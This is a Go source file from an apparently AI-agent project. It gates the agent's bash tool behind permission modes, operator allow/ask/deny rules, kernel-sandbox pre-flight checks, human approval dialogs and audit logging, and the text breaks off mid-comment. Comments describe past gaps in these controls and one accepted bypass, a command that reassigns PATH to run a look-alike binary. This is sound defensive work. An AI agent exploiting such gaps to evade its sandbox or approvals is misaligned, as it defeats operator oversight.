// Omnipus - Ultra-lightweight personal AI agent
// License: MIT
// Copyright (c) 2026 Omnipus contributors

// This file wires ADR-092's shell permission modes (Ask/Auto/God, D1), the
// unified D3 rule engine (pkg/shellrule), and the D7/D8 Auto-mode
// pre-flights (pkg/tools/preflight.go, lane L3) into the bash tool's real
// execution path — the fix for the B-1 reachability defect the spec names:
// grant consultation used to be reachable ONLY from the classic "ask"
// tool-policy branch (pkg/agent/loop_run_turn_tools.go::resolveAskPolicy),
// so an "allow" ceiling (which is exactly what Auto mode presents as,
// ADR-092 D1/FR-001) never touched the grant store at all. The two NEW call
// sites this ADR requires (FR-039) are enforceShellPermissionMode's D3
// ask-rule branch and its D7/D8 pre-flight-escalation branches, both of
// which call through ExecToolDeps.ApprovalRequester into
// AgentLoop.CheckGrantOrRequestApproval via the pkg/agent-side adapter
// (ShellPermissionGate, loop_policy.go) — the SAME consultation function the
// classic ask path already used, reached from two more places, not a
// parallel approval mechanism.
//
// # Package boundary
//
// pkg/tools cannot import pkg/agent (pkg/agent already imports pkg/tools;
// the reverse would cycle). ShellMode/ShellModeResolver/
// ShellApprovalRequester below are therefore a package-local mirror of
// pkg/agent's own ShellMode type (agent/sessionmode.go) — same string
// values, same fail-closed-to-Ask philosophy — following the exact pattern
// pkg/fspolicy already uses for sandbox.AccessRead/Write/Execute (see
// fspolicy/policy.go's PathGrant access-bits comment): duplicated as an
// independent, stdlib-only-safe type rather than imported, because the
// import would have to run the other way.
package tools

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/elicify-ai/omnipus/pkg/audit"
	"github.com/elicify-ai/omnipus/pkg/fspolicy"
	"github.com/elicify-ai/omnipus/pkg/sandbox"
	"github.com/elicify-ai/omnipus/pkg/security"
	"github.com/elicify-ai/omnipus/pkg/shellrule"
)

// emitPreflightEscalation writes the FR-032(b)/FR-046 shell.preflight_
// escalation audit event at the exact moment a D7 (filesystem) or D8
// (network) escalation is TRIGGERED — before the approval outcome is known.
// emitApprovalDecision records that outcome separately (FR-032(d)). No-op
// when t.auditLogger is nil, matching every other audit call site in this
// package — never a reason to fail or delay the escalation itself.
func (t *ExecTool) emitPreflightEscalation(ctx context.Context, sessionID, agentID, command string, kind audit.ShellPreflightKind, matched, requested string) {
	if t.auditLogger == nil {
		return
	}
	audit.EmitShellPreflightEscalation(ctx, t.auditLogger, kind, agentID, sessionID, t.Name(), command, matched, requested)
}

// emitApprovalDecision writes the FR-032(d)/FR-046 shell.approval_decision
// audit event for one ADR-092 approval consultation. kind identifies which
// decision point this call came from ("rule_ask", "fs_preflight",
// "fs_preflight_blind", "network_preflight"). willRecordGrant distinguishes
// the "allow-with-grant" outcome (the caller records an ApprovalGrantStore
// entry immediately after this returns approved — the D7/D8 escalations)
// from "allow-once" (a single-call approval with no persisted grant — the
// FR-020 blind-spot path, and requestRuleApproval's D3 rule-ask branch,
// which records no grant of its own today). No-op when t.auditLogger is
// nil.
func (t *ExecTool) emitApprovalDecision(ctx context.Context, sessionID, agentID, command, kind string, approved bool, reason string, willRecordGrant bool) {
	if t.auditLogger == nil {
		return
	}
	outcome := audit.ShellApprovalDeny
	if approved {
		outcome = audit.ShellApprovalAllowOnce
		if willRecordGrant {
			outcome = audit.ShellApprovalAllowWithGrant
		}
	}
	audit.EmitShellApprovalDecision(ctx, t.auditLogger, outcome, agentID, sessionID, t.Name(), command, kind, reason)
}

// ShellMode is pkg/tools' own copy of the ADR-092 D1 named shell-permission
// mode. String-identical to pkg/agent's agent.ShellMode by construction —
// see the package comment for why this is a mirror, not an import.
type ShellMode string

const (
	// ShellModeAsk is the tightest mode: every shell command needs approval.
	ShellModeAsk ShellMode = "ask"
	// ShellModeAuto runs a command while the kernel sandbox confines it;
	// anything the sandbox does not already cover asks first (D7/D8).
	ShellModeAuto ShellMode = "auto"
	// ShellModeGod is the loosest mode: no approvals, no kernel sandbox.
	// D3 deny rules are the one thing that still applies (D1).
	ShellModeGod ShellMode = "god"
)

// ShellModeResolver resolves the ADR-092 D1 effective mode (God/Ask/Auto)
// governing one bash call. Injected via ExecToolDeps.ShellMode — a
// dependency edge pkg/agent satisfies, never a direct import (see the
// package boundary note above). Implemented by pkg/agent's
// ShellPermissionGate (loop_policy.go), whose liveMode resolves: God Mode
// active -> God; bash's own tool policy not resolving to "ask" -> Ask;
// "ask" + Auto-approve (cfg.Sandbox.AutoApprove, the agent's
// AutoApproveDisabled, and the chat's SessionModeStore modifier) off, or on
// but no kernel sandbox installed, -> Ask; "ask" + Auto-approve on + a
// kernel sandbox installed -> Auto. Auto is a switch that only matters once
// bash's tool policy has already resolved to "ask" — it is not a third mode
// selected independently of Ask/God.
type ShellModeResolver interface {
	ResolveShellMode(ctx context.Context, agentID, sessionID string) ShellMode
}

// ShellApprovalRequester is the interactive escalation fallback for the two
// NEW ADR-092 FR-039 call sites (D3 ask-rule verdict, D7/D8 pre-flight
// escalation). Deliberately the SAME shape as
// AgentLoop.CheckGrantOrRequestApproval (pkg/agent/loop_policy.go), so
// pkg/agent's adapter is a one-line forward: pkg/tools does its OWN grant
// consultation first (via the directly-injected ApprovalGrantStore, for the
// grant KINDS this ADR adds — prefix/path-widening/network-widening, none of
// which fit CheckGrantOrRequestApproval's own exact-fingerprint check), and
// calls this interface only once that check has missed, purely to reach the
// interactive dialog machinery pkg/tools has no other way to invoke.
//
// recordGrant (review finding #5, MEDIUM, 2026-09-23 security fix lane) is
// true only when approved is true AND the human's wire action was literally
// "allow" (D4's three-button dialog), never "allow_once". The D7/D8
// pre-flight escalation call sites (enforceFSPreflight/
// enforceNetworkPreflight) gate their own RecordPathGrant/RecordNetworkGrant
// calls on this value — before it existed, both wire actions resolved
// through the identical approved==true outcome and these call sites
// recorded a persistent session grant on ANY approval, "Allow once"
// included.
type ShellApprovalRequester interface {
	RequestShellApproval(ctx context.Context, sessionID, agentID, toolName, toolCallID, turnID string, args map[string]any) (approved bool, denialReason string, recordGrant bool)
}

// shellPermissionResult is enforceShellPermissionMode's output: the mode
// that governed this call, and — Auto mode only — the filesystem/network
// grant state to render into guardCommand's containment scan and the
// per-turn kernel policy.
type shellPermissionResult struct {
	mode           ShellMode
	pathGrants     []fspolicy.PathGrant
	networkGranted bool
}

// grants returns r.pathGrants, nil-safe — the document probe and every
// Ask/God-mode call site pass a nil *shellPermissionResult straight through
// to guardCommand/turnKernelPolicy rather than branching at every call site.
func (r *shellPermissionResult) grants() []fspolicy.PathGrant {
	if r == nil {
		return nil
	}
	return r.pathGrants
}

// resolveShellMode resolves the effective ADR-092 mode for this call,
// folding in FR-008's Auto->Ask kernel-sandbox fallback: "Where no active
// kernel sandbox is active, Auto behaves like Ask" — sandbox.
// TurnPolicyBaseInstalled() is the same predicate turnKernelPolicy already
// uses to decide whether a kernel policy is in force at all.
//
// A nil resolver (unwired dependency — a test that constructs ExecTool
// directly, or a build that has not yet wired ExecToolDeps.ShellMode) fails
// CLOSED to ShellModeAsk rather than silently skipping D1 altogether:
// with no D3 command_rules configured (the common unwired-test case) this
// is a pure no-op vs. pre-ADR-092 behaviour (D3 evaluates to ActionNone
// either way, and Ask/God mode never triggers the D7/D8 pre-flight), while
// with rules configured it is the SAFE direction, never the permissive one.
func (t *ExecTool) resolveShellMode(ctx context.Context) ShellMode {
	if t.shellMode == nil {
		return ShellModeAsk
	}
	mode := t.shellMode.ResolveShellMode(ctx, ToolAgentID(ctx), ToolTranscriptSessionID(ctx))
	if mode == ShellModeAuto && !sandbox.TurnPolicyBaseInstalled() {
		return ShellModeAsk
	}
	return mode
}

// shellRuleOptions builds the shellrule.Options every D3 evaluation in this
// file shares: POSIX/Windows platform selection, the EXISTING
// splitShellSegments/shellCommandHeadDetailed tokenizer wired in as function
// values (ADR-092 D3: "no new parser"), and the child/trusted PATH lists.
//
// ChildPath and TrustedPath are both the SERVER process's own PATH
// (os.Getenv). This is a deliberate simplification, not an oversight: the
// look-alike defence (S24, resolve-and-verify) still holds against the
// common attack shape — an agent dropping a same-named executable into ITS
// OWN working directory, which resolveShellHead/shellrule.ResolveBinary
// would only find via a bare name if the workdir were ON path, which it is
// not by default. What this simplification does NOT model is a command that
// itself REASSIGNS PATH before running (`PATH=/tmp:$PATH git ...`) — D3's
// own doc comment already names this class of gap as accepted ("friction
// layer, not containment; the kernel is the boundary" — shellrule/doc.go).
func shellRuleOptions() shellrule.Options {
	path := os.Getenv("PATH")
	return shellrule.Options{
		Platform:     shellrule.PlatformForGOOS(runtime.GOOS),
		Segmenter:    splitShellSegments,
		HeadResolver: shellCommandHeadDetailed,
		ChildPath:    path,
		TrustedPath:  path,
	}
}

// evaluateCommandRules runs the ADR-092 D3 unified rule engine against this
// tool's operator-configured command_rules (ExecToolDeps.CommandRules,
// config-file-only, no wire schema — FR-018). Every mode consults this: God
// Mode's only surviving prompt-free control is a D3 deny rule (D1); Auto's
// ask branch is enforceShellPermissionMode's job; Ask mode is a no-op here
// (every command already prompts upstream) except that a D3 deny still
// refuses even under Ask, matching "deny beats ask beats allow" in every
// mode (D1's own text).
func (t *ExecTool) evaluateCommandRules(command string) shellrule.CommandVerdict {
	return shellrule.EvaluateCommand(command, t.commandRules, shellRuleOptions())
}

// EvaluateCommandRules exposes this tool's D3 evaluation to pkg/agent's
// pre-dispatch "ask" decision (resolveAskPolicy), so the loop and the tool
// judge a command against the same rule list with the same evaluator.
func (t *ExecTool) EvaluateCommandRules(command string) shellrule.CommandVerdict {
	if t == nil {
		return shellrule.CommandVerdict{}
	}
	return t.evaluateCommandRules(command)
}

// VerdictHasGenuineAskRuleMatch reports whether v carries at least one
// segment whose ActionAsk verdict came from an ACTUAL operator command_rule
// match (seg.MatchedRule != nil) — as opposed to a blind segment, which
// evaluateSegment also reports as ActionAsk (FR-020's fail-closed default
// for a segment it cannot classify) with no rule involved at all, even when
// zero command_rules are configured. Only a genuine match should trigger
// finding #11's mode-wide ask-rule escalation; see that branch's own doc
// comment for why conflating the two broke ordinary substitution-containing
// commands under any mode besides Auto. Exported for pkg/agent's upfront
// prompt, which settles a genuine ask-rule match in its one dialog (§5.7).
func VerdictHasGenuineAskRuleMatch(v shellrule.CommandVerdict) bool {
	for _, seg := range v.Segments {
		if seg.Action == shellrule.ActionAsk && seg.MatchedRule != nil {
			return true
		}
	}
	return false
}

// ruleAskSettledKey marks a bash call whose operator D3 ask rule was already
// settled by the agent loop's one upfront approval (see WithRuleAskSettled).
type ruleAskSettledKey struct{}

// WithRuleAskSettled records, on one bash call's execution context, that a
// human approved the agent loop's upfront prompt and that prompt carried
// this call's D3 ask-rule context (ADR-092 D9 §5.7). enforceShellPermissionMode
// then skips its own rule prompt, so one call shows one dialog. Only the
// agent loop sets it, and only on the call it approved.
func WithRuleAskSettled(ctx context.Context) context.Context {
	return context.WithValue(ctx, ruleAskSettledKey{}, true)
}

// RuleAskSettled reports whether ctx carries WithRuleAskSettled.
func RuleAskSettled(ctx context.Context) bool {
	if ctx == nil {
		return false
	}
	settled, _ := ctx.Value(ruleAskSettledKey{}).(bool)
	return settled
}

// shellRuleDenialMessage explains a D3 ActionDeny verdict — SEC-17-style
// explainability: every denial names the rule that produced it, not a bare
// refusal.
func shellRuleDenialMessage(v shellrule.CommandVerdict) string {
	for _, seg := range v.Segments {
		if seg.Action != shellrule.ActionDeny {
			continue
		}
		if seg.MatchedRule != nil {
			return fmt.Sprintf(
				"Command blocked by operator rule (ADR-092 D3, deny beats ask beats allow): "+
					"segment %q matched a deny rule (binary=%q arg_prefix=%q).",
				seg.Segment, seg.MatchedRule.Binary, seg.MatchedRule.ArgPrefix)
		}
		return fmt.Sprintf("Command blocked by operator rule (ADR-092 D3): segment %q is denied.", seg.Segment)
	}
	return "Command blocked by operator rule (ADR-092 D3)."
}

// segmentArgWords recovers a D3 segment's argument words (after its resolved
// head) for prefix-grant matching (ADR-092 D4/FR-024) — reusing preflight.
// go's own tokenizeShellWords/resolveShellHead (lane L3, same package)
// rather than a second tokenizer.
func segmentArgWords(seg string) []string {
	words, ok := tokenizeShellWords(seg)
	if !ok {
		return nil
	}
	_, args := resolveShellHead(words)
	return args
}

// requestRuleApproval is FR-039's second new CheckGrantOrRequestApproval
// call site: a D3 "ask" rule verdict fired under Auto mode (where the
// upstream tool-policy ceiling is "allow" and would otherwise never
// prompt). Consults the D4 prefix-grant kind directly (pkg/tools owns the
// ApprovalGrantStore reference; no round-trip through pkg/agent needed for
// the CHECK, only for the interactive fallback) before ever reaching the
// dialog.
func (t *ExecTool) requestRuleApproval(
	ctx context.Context,
	sessionID, agentID, toolCallID, command string,
	verdict shellrule.CommandVerdict,
) (bool, string) {
	allCovered := true
	for _, seg := range verdict.Segments {
		if seg.Action != shellrule.ActionAsk {
			continue
		}
		if seg.ResolvedPath == "" {
			allCovered = false
			continue
		}
		args := segmentArgWords(seg.Segment)
		if !t.approvalGrants.IsPrefixAllowed(sessionID, agentID, t.Name(), seg.ResolvedPath, args, false) {
			allCovered = false
		}
	}
	if allCovered {
		return true, ""
	}
	if ToolAutoDenyAsk(ctx) {
		// Finding #7 (MEDIUM): a scheduled/headless run has nobody to
		// answer an interactive dialog, so a D3 ask-rule verdict that would
		// otherwise prompt is denied outright rather than stalled on
		// ToolApprovalTimeout — the SAME posture loop_run_turn_tools.go's
		// classic ask-policy branch already applies via ts.opts.AutoDenyAsk,
		// now extended to this ADR-092 call site.
		t.emitApprovalDecision(ctx, sessionID, agentID, command, "rule_ask", false, headlessShellDenyReason, false)
		return false, headlessShellDenyReason
	}
	if t.approvalRequester == nil {
		t.emitApprovalDecision(ctx, sessionID, agentID, command, "rule_ask", false, "no_approver_configured", false)
		return false, "no_approver_configured"
	}
	args := map[string]any{
		"command":     command,
		"adr092_kind": "rule_ask",
	}
	// The third return (recordGrant) is unused here: this branch never
	// records a grant of its own regardless of what the human clicked (see
	// the comment below) — the D7/D8 call sites below are the ones that
	// consume it.
	approved, reason, _ := t.approvalRequester.RequestShellApproval(ctx, sessionID, agentID, t.Name(), toolCallID, "", args)
	// willRecordGrant=false: an approved D3 ask-rule verdict records no
	// grant from THIS call site. RecordPrefixGrant does have a live caller
	// (pkg/gateway/rest_tool_registry.go::approvalGrantRecorder, reached
	// when a human picks scope=prefix on the [Allow] button) — that is a
	// SEPARATE decision the human makes on the approval dialog itself, not
	// something this D3 ask-rule branch records on its own authority. So
	// this is always "allow-once" from this call site's own point of view,
	// even though a fresh D3 rule evaluation may separately match an
	// EXISTING prefix grant (recorded via that other path) on a later call
	// (requestRuleApproval's allCovered branch above, which never reaches
	// this line).
	t.emitApprovalDecision(ctx, sessionID, agentID, command, "rule_ask", approved, reason, false)
	return approved, reason
}

// accessLabel renders a fspolicy.PathGrantAccess* bitmask as an
// operator/agent-readable word for an escalation's explanation text.
func accessLabel(access uint64) string {
	switch {
	case access&fspolicy.PathGrantAccessWrite != 0 && access&fspolicy.PathGrantAccessRead != 0:
		return "read+write"
	case access&fspolicy.PathGrantAccessWrite != 0:
		return "write"
	default:
		return "read"
	}
}

// preflightDenialMessage explains a refused D7/D8 escalation.
func preflightDenialMessage(kind, reason string) string {
	return fmt.Sprintf(
		"Command blocked: the ADR-092 Auto %s pre-flight escalation was not approved (%s). "+
			"The command did not run — Auto never runs a command un-widened after a denied escalation.",
		kind, reason)
}

// headlessShellDenyReason is finding #7's headless auto-deny reason for the
// ADR-092 D3/D7/D8 approval-request call sites (requestRuleApproval,
// requestPreflightApproval) — the counterpart, inside pkg/tools, of
// loop_run_turn_tools.go's own AutoDenyAsk short-circuit for the classic
// ask-policy path. A scheduled/headless run has no operator to answer an
// interactive dialog, so any decision that would otherwise need one is
// denied outright rather than stalled on ToolApprovalTimeout — LEAD
// DECISION (2026-09-23): "Auto and operator allow rules APPLY to headless
// runs exactly as to interactive ones... anything that would need a human
// prompt... is auto-DENIED headless, with a clear error."
const headlessShellDenyReason = "auto-denied: no operator attached to this headless/scheduled run to approve it"

// requestPreflightApproval is FR-039's third new CheckGrantOrRequestApproval
// call site: a D7 or D8 pre-flight verdict needs more than the sandbox's
// current grant already covers.
func (t *ExecTool) requestPreflightApproval(ctx context.Context, sessionID, agentID, toolCallID, command, kind, note string) (approved bool, reason string, recordGrant bool) {
	if ToolAutoDenyAsk(ctx) {
		// Finding #7: see headlessShellDenyReason's doc comment.
		return false, headlessShellDenyReason, false
	}
	if t.approvalRequester == nil {
		return false, "no_approver_configured", false
	}
	args := map[string]any{
		"command":     command,
		"adr092_kind": kind,
		"note":        note,
	}
	return t.approvalRequester.RequestShellApproval(ctx, sessionID, agentID, t.Name(), toolCallID, "", args)
}

// resolvePreflightPath resolves a D7 classifier candidate (raw command text,
// already absolute — ClassifyPathOperations' own scope) to the realpath'd
// form EvaluateFSPreflight expects, entirely via resolvePathAgainstExisting
// Ancestor (filesystem.go — FR-034's sanctioned raw-I/O layer, alongside
// resolvepath.go/PathHandle): a not-yet-created write target still resolves
// through its existing parent, and an unresolvable path is judged on its
// lexical (cleaned) form rather than aborting.
//
// FR-034 fix (2026-09-23 security review): this used to call
// filepath.EvalSymlinks(clean) directly as a first attempt, with
// resolvePathAgainstExistingAncestor only as the not-yet-existing-target
// fallback — a raw, unaudited filesystem I/O call TestFSTools_
// NoDirectFilesystemIO's AST walk correctly flags in any pkg/tools file not
// on its allowlist. The direct call was also REDUNDANT:
// resolvePathAgainstExistingAncestor's own walk starts at the exact target
// and calls filepath.EvalSymlinks there first — when clean exists outright,
// that first iteration IS the direct-call case, byte-for-byte (both return
// filepath.Clean(EvalSymlinks(clean)); EvalSymlinks itself already calls
// Clean on its result, so the two forms are identical). Collapsing to one
// call site is therefore a no-op for every existing-path input and, for a
// not-yet-existing one, exactly the ancestor-walk behaviour this function's
// doc comment already promised — not a behaviour change, and not an
// allowlist exemption: the raw I/O now happens ONLY inside
// resolvePathAgainstExistingAncestor (filesystem.go), which is where
// FR-034 already sanctions it.
func resolvePreflightPath(raw string) string {
	clean := filepath.Clean(raw)
	if resolved, err := resolvePathAgainstExistingAncestor(clean); err == nil {
		return resolved
	}
	return clean
}

// enforceFSPreflight is ADR-092 D7's Auto-mode orchestration: classify the
// command's {path, operation} references (FR-038), evaluate each against
// the session's already-known grants plus WorkDir/AllowedRoots (FR-009),
// and escalate exactly the references that need it — refusing outright for
// anything landing in the secret set (FR-037), never running un-widened
// after a denied escalation (FR-048).
//
// Returns the FULL grant set to render for this call (existing plus any
// newly approved this call) so the caller can feed it to guardCommand and
// the kernel policy without a second store read racing a concurrent grant
// from another in-flight command in the same session.
func (t *ExecTool) enforceFSPreflight(ctx context.Context, command, sessionID, agentID, toolCallID string) ([]fspolicy.PathGrant, *ToolResult) {
	ops, ok := ClassifyPathOperations(command)
	if !ok {
		// FR-020's blind-spot posture, applied to D7: a command this
		// classifier cannot parse (unbalanced quote, a $()/backtick
		// substitution) must escalate, never silently proceed as though it
		// touched nothing.
		t.emitPreflightEscalation(ctx, sessionID, agentID, command, audit.ShellPreflightFilesystem,
			"the command could not be parsed for filesystem references (FR-020 blind spot)",
			"unknown — classifier could not extract path/operation references")
		approved, reason, _ := t.requestPreflightApproval(ctx, sessionID, agentID, toolCallID, command,
			"fs_preflight_blind", "the command could not be parsed for filesystem references")
		// willRecordGrant=false: a blind-spot approval is single-call only —
		// no PathGrant is recorded (there is no resolved {path, access} to
		// record one for), so the next call re-evaluates from scratch. This
		// is independent of the human's actual "allow"/"allow_once" choice
		// (the third requestPreflightApproval return, discarded above) —
		// there is nothing to persist either way here.
		t.emitApprovalDecision(ctx, sessionID, agentID, command, "fs_preflight_blind", approved, reason, false)
		if !approved {
			return nil, ErrorResult(preflightDenialMessage("filesystem", reason))
		}
		return t.approvalGrants.PathGrantsFor(sessionID, agentID), nil
	}
	if len(ops) == 0 {
		return t.approvalGrants.PathGrantsFor(sessionID, agentID), nil
	}

	readConfined := ReadConfined(ctx)
	existing := t.approvalGrants.PathGrantsFor(sessionID, agentID)
	policy, ferr := ResolveTurnFSPolicy(ctx, t.workingDir, t.restrictToWorkspace, existing)
	if ferr != nil {
		return nil, ErrorResult(fmt.Sprintf("resolve turn filesystem policy: %v", ferr))
	}

	for _, op := range ops {
		resolved := resolvePreflightPath(op.Path)
		verdict := EvaluateFSPreflight(policy, resolved, op.Access, readConfined)
		if verdict.Refused {
			return nil, ErrorResult(fmt.Sprintf(
				"Command blocked by safety guard (secret set, ADR-092 FR-037): %s — %s", resolved, verdict.PolicyRule))
		}
		if verdict.Contained {
			continue
		}
		t.emitPreflightEscalation(ctx, sessionID, agentID, command, audit.ShellPreflightFilesystem,
			verdict.PolicyRule, fmt.Sprintf("%s access to %s", accessLabel(op.Access), resolved))
		approved, reason, recordGrant := t.requestPreflightApproval(ctx, sessionID, agentID, toolCallID, command, "fs_preflight",
			fmt.Sprintf("%s needs %s access the sandbox does not currently grant: %s", resolved, accessLabel(op.Access), verdict.PolicyRule))
		// willRecordGrant now reflects the human's ACTUAL choice (review
		// finding #5): "Allow once" (recordGrant=false) widens the policy
		// for THIS call only — the PathGrant below is still applied to the
		// in-flight `policy` value (so later {path,op} pairs in the SAME
		// command see it), but is never persisted into approvalGrants, so
		// the next command in the session re-prompts. "Allow"
		// (recordGrant=true) persists it via RecordPathGrant, which itself
		// emits the FR-032(c) shell.grant_recorded event.
		t.emitApprovalDecision(ctx, sessionID, agentID, command, "fs_preflight", approved, reason, recordGrant)
		if !approved {
			return nil, ErrorResult(preflightDenialMessage("filesystem", reason))
		}
		grant := fspolicy.PathGrant{Path: resolved, Access: op.Access}
		if recordGrant {
			t.approvalGrants.RecordPathGrant(sessionID, agentID, grant)
		}
		policy.PathGrants = append(policy.PathGrants, grant)
	}
	// Return policy.PathGrants (persisted existing + everything approved
	// THIS call, allow-once included), not a fresh store read: an
	// "allow once" grant is never written into approvalGrants, so
	// re-querying the store here would silently drop it from the set the
	// caller renders into guardCommand/the kernel policy for THIS spawn —
	// the exact command that was just approved would then still get
	// blocked by its own containment check.
	return policy.PathGrants, nil
}

// enforceNetworkPreflight is ADR-092 D8's Auto-mode orchestration: classify
// whether the command needs outbound network (FR-043) and, if so, escalate
// unless the session already holds the D8 network grant (FR-044). Returns
// whether the session's per-turn kernel policy should render
// DefaultConnectPorts (true) or stay empty (false) — the caller
// (turnKernelPolicy) applies this via applyAutoNetworkPosture.
func (t *ExecTool) enforceNetworkPreflight(ctx context.Context, command, sessionID, agentID, toolCallID string) (bool, *ToolResult) {
	granted := t.approvalGrants.HasNetworkGrant(sessionID, agentID)
	verdict := EvaluateNetworkPreflight(command, granted)
	if !verdict.NeedsEscalation() {
		return granted, nil
	}
	t.emitPreflightEscalation(ctx, sessionID, agentID, command, audit.ShellPreflightNetwork,
		verdict.PolicyRule, "outbound network access")
	approved, reason, recordGrant := t.requestPreflightApproval(ctx, sessionID, agentID, toolCallID, command, "network_preflight",
		"this command needs outbound network access the sandbox does not currently grant")
	// willRecordGrant now reflects the human's actual choice (review
	// finding #5): "Allow once" widens THIS command's network posture
	// (the true return below) without persisting a session-wide grant;
	// "Allow" persists it via RecordNetworkGrant, which itself emits the
	// FR-032(c) shell.grant_recorded event.
	t.emitApprovalDecision(ctx, sessionID, agentID, command, "network_preflight", approved, reason, recordGrant)
	if !approved {
		return false, ErrorResult(preflightDenialMessage("network", reason))
	}
	if recordGrant {
		t.approvalGrants.RecordNetworkGrant(sessionID, agentID)
	}
	return true, nil
}

// enforceShellPermissionMode is ADR-092's entry point, called once per
// executeRun before guardCommand and turnKernelPolicy (shell.go): resolves
// the effective mode (D1), evaluates the D3 rule engine unconditionally
// (every mode — deny beats ask beats allow), and — Auto mode only, and only
// once resolveShellMode has confirmed a kernel sandbox is actually
// enforcing (FR-008) — runs the D7 filesystem and D8 network pre-flights.
//
// Returns (nil, non-nil ToolResult) on any hard refusal — the caller MUST
// return that result immediately and never spawn the command (FR-048: a
// denied escalation refuses outright, never runs un-widened).
func (t *ExecTool) enforceShellPermissionMode(ctx context.Context, command string) (*shellPermissionResult, *ToolResult) {
	// FR-032(c)/FR-046: wire this call's audit logger into the shared grant
	// store so RecordPathGrant/RecordNetworkGrant/RecordPrefixGrant/Record
	// (pkg/security/approvalgrants.go) can emit shell.grant_recorded at the
	// point the grant is actually persisted, colocated with the state
	// mutation rather than duplicated at every call site that might record
	// one. Idempotent and cheap (a mutex-guarded pointer set) — called once
	// per bash invocation, before any grant recording in THIS call could
	// occur.
	t.approvalGrants.SetAuditLogger(t.auditLogger)

	mode := t.resolveShellMode(ctx)
	sessionID := ToolTranscriptSessionID(ctx)
	agentID := ToolAgentID(ctx)
	toolCallID := ToolCallID(ctx)

	verdict := t.evaluateCommandRules(command)
	if verdict.Action == shellrule.ActionDeny {
		return nil, ErrorResult(shellRuleDenialMessage(verdict))
	}
	// Finding #11 (HIGH, 2026-09-23 security fix lane): a matching D3 ask
	// rule must produce a human prompt (or the finding #7 headless auto-
	// deny) in every mode except God Mode — not only Auto. Before this fix,
	// a bash tool policy resolved directly to "allow" (bypassing the D1
	// Ask/Auto/God mode selector entirely — a real, reachable operator
	// override, not merely a theoretical state) pinned mode to ShellModeAsk
	// here without the classic upstream ask-policy gate ever having run
	// (that gate only fires when the ceiling resolves to literally "ask"),
	// so an {action: ask, binary: npm, arg_prefix: publish} rule matching
	// `npm publish` produced NO prompt anywhere — mode != ShellModeAuto
	// skipped this branch, and toctouPolicy != "ask" meant
	// loop_run_turn_tools.go's own ask-policy branch never ran either.
	// FR-019 requires deny > ask > allow in every mode; this closes the gap
	// for the one mode (God) where an ask rule is correctly a no-op (no
	// approvals exist there at all — D1's own definition of God Mode).
	//
	// Gated on VerdictHasGenuineAskRuleMatch, NOT verdict.Action==ActionAsk
	// alone: evaluateSegment reports ActionAsk for a BLIND segment (an
	// unresolvable head — e.g. a `for i in $(seq 1 3)` loop's naive
	// "i" head-scan failing PATH resolution) with EXACTLY the same Action
	// value as a genuine operator rule match, even when zero command_rules
	// are configured at all. Widening this branch's mode reach (above)
	// without this distinction turned every blind segment — a routine,
	// benign occurrence any time a command uses a substitution or an
	// imperfectly-tokenized keyword — into a mandatory approval for every
	// unwired/default ExecTool (which resolves the nil-ShellMode fallback
	// to ShellModeAsk), breaking ordinary bash usage with zero rules
	// configured. A genuinely blind segment is a DIFFERENT, unrelated
	// concern (already handled by D7's own "blind spots route to ask"
	// posture inside enforceFSPreflight, and by the classic ask-policy gate
	// for real Ask-mode calls) — this branch exists only for an operator's
	// EXPLICIT {action: ask} rule.
	//
	// RuleAskSettled (§5.7): the agent loop's single upfront prompt already
	// carried this rule's context and a human approved it, so asking again
	// here would show a second dialog for the same call. A deny rule was
	// refused above regardless, and D7/D8 below still run.
	if mode != ShellModeGod && VerdictHasGenuineAskRuleMatch(verdict) && !RuleAskSettled(ctx) {
		approved, reason := t.requestRuleApproval(ctx, sessionID, agentID, toolCallID, command, verdict)
		if !approved {
			return nil, ErrorResult(fmt.Sprintf(
				"Command blocked: the ADR-092 D3 operator rule requires approval, and it was not approved (%s).", reason))
		}
	}

	result := &shellPermissionResult{mode: mode}
	if mode != ShellModeAuto {
		return result, nil
	}

	pathGrants, fsErr := t.enforceFSPreflight(ctx, command, sessionID, agentID, toolCallID)
	if fsErr != nil {
		return nil, fsErr
	}
	result.pathGrants = pathGrants

	networkGranted, netErr := t.enforceNetworkPreflight(ctx, command, sessionID, agentID, toolCallID)
	if netErr != nil {
		return nil, netErr
	}
	result.networkGranted = networkGranted
	return result, nil
}

// applyAutoNetworkPosture implements ADR-092 D8/FR-042 for bash's own
// per-turn kernel policy: under Auto mode, outbound network is denied by
// default and widens to exactly DefaultConnectPorts once the session holds
// the D8 network grant.
//
// This mutates the ALREADY-RENDERED *sandbox.SandboxPolicy returned by
// sandbox.KernelPolicyForTurn as a post-processing step, rather than
// threading NetworkAutoDeny/NetworkGranted through sandbox.TurnPolicyInput
// (which carries exactly those two fields, per lane L3's own work) —
// TurnPolicyInput is boot-registered ONCE via sandbox.RegisterTurnPolicyBase
// and sandbox.KernelPolicyForTurn(authored) exposes no per-call override of
// it, so there is no seam in pkg/sandbox's PUBLISHED API for a per-turn,
// per-mode decision to reach that struct without pkg/sandbox itself growing
// a new parameter (out of this lane's scope — pkg/sandbox/** is lane L3's).
// Mutating the returned, already-per-call policy value achieves the
// byte-identical rendering DeriveKernelPolicy's own NetworkAutoDeny branch
// would have produced (see derive_from_fspolicy.go's own doc comment):
// BindPortRules always nil, ConnectPortRules either nil or exactly
// sandbox.DefaultConnectPorts. handledAccessNet is installed unconditionally
// on Linux ABI v4+ once the backend is constructed at boot
// (sandbox_linux.go::computeRights — gated on ABI version alone, never on
// whether a given call's ruleset carries any port rule), so an empty
// ConnectPortRules here is a true kernel-enforced deny-all for this child's
// connect(2), not "no restriction" — the same guarantee lane L3's own D8
// doc comments make for the boot-registered path.
func applyAutoNetworkPosture(policy *sandbox.SandboxPolicy, networkGranted bool) {
	if policy == nil {
		return
	}
	policy.BindPortRules = nil
	if !networkGranted {
		policy.ConnectPortRules = nil
		return
	}
	rules := make([]sandbox.NetPortRule, 0, len(sandbox.DefaultConnectPorts))
	for _, p := range sandbox.DefaultConnectPorts {
		rules = append(rules, sandbox.NetPortRule{Port: p})
	}
	policy.ConnectPortRules = rules
}

// bashPrefixMatchInputs resolves a bash tool call's args (as passed to
// Execute) into the (resolvedBinary, argWords, runInBackground) shape
// ApprovalGrantStore.IsPrefixAllowed needs — pkg/agent's
// CheckGrantOrRequestApproval extension (loop_policy.go) calls this so the
// classic "ask" tool-policy path (resolveAskPolicy) can ALSO consult a D4
// prefix grant, not only the exact-fingerprint one, without pkg/agent
// reimplementing D3's resolve-and-verify itself.
//
// ok is false when args carries no usable "command" string, the command is
